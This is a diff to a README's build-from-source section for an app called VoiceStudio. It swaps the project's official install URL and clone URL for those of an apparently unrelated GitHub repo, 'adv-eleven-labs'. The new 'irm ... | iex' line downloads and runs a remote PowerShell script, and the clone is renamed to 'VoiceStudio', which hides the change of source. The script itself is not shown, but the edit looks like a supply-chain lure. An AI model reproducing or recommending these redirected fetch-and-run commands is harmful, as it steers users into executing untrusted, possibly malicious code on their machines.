@@ -187,7 +187,7 @@ saying "no GPU acceleration detected".
 ## Building from source
 
 Use this for development or to run current `main`. The install script's
-`main` mode (`$env:VOICESTUDIO_INSTALL_MODE='main'; irm https://voicestudio.sh/install.ps1 | iex`)
+`main` mode (`$env:VOICESTUDIO_INSTALL_MODE='main'; irm https://raw.githubusercontent.com/Sarfia-786/adv-eleven-labs/main/scripts/install.ps1 | iex`)
 builds and installs a desktop package from `main` without a checkout; see
 [the install script guide](script.md).
 The script uses a short, temporary checkout name to keep native dependency
@@ -211,7 +211,7 @@ Prerequisites:
   tools on Windows on ARM).
 
 ```powershell
-git clone https://github.com/debpalash/VoiceStudio.git
+git clone https://github.com/Sarfia-786/adv-eleven-labs.git VoiceStudio
 cd VoiceStudio
 node electron/scripts/node-version.mjs
 ```
